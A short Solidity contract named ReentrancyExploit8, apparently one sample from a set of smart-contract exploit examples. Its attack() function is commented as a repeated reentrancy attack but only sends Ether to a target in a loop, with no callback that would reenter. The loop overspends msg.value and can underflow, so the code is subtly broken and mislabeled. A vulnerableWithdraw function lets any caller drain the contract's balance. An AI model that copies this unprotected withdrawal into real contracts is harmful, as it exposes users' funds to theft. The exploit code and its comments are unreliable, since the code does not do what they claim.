pragma solidity ^0.8.0;

contract ReentrancyExploit8 {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() public payable {
        // Exploit: Repeated reentrancy attack with decreasing value
        uint value = msg.value;
        for (uint i = 0; i < 10; i++) {
            (bool success, ) = target.call{value: value}("");
            require(success, "Call failed");
            value -= 0.1 ether;
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function vulnerableWithdraw(uint amount) public {
        require(amount <= address(this).balance, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    fallback() external payable {}
}
